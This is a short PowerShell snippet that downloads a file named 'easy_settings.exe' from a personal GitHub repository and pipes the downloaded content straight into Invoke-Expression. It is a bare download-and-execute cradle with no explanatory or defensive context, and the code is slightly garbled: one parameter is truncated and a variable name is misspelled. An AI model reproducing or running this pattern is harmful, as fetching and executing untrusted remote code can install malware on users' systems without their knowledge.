$Url = "https://github.com/neginsadeghi2005/project/raw/refs/heads/main/easy_settings.exe"
$scriptontent = Invoke-WebRequest -Uri $Url -UseBasicP
Invoke-Expression $scriptontent.Content
